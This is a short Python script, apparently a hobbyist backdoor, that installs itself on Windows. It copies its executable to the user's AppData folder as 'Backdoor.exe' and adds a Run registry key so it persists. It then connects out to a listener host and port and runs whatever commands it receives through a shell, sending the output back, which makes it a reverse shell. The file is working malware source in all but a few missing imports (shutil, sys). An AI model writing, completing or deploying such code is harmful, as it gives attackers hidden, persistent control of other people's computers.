#!/usr/share/python3

# SOCKET
#      CONNECT

from distutils.cmd import Command
import socket
import subprocess
import json
import os


def reliable_send(data):
	json_data = json.dumps(data).encode()
	sock.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + sock.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
				
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result.decode())

			except:
				reliable_send("[!!] Can't Execute That Command")

location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #usage for ipv4 add & tcp connection to server
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.connect(("127.0.0.1",54321)) #ip of host + desired port
print ("CONNECTION ESTABLISHED TO SERVER")
shell()
sock.close()

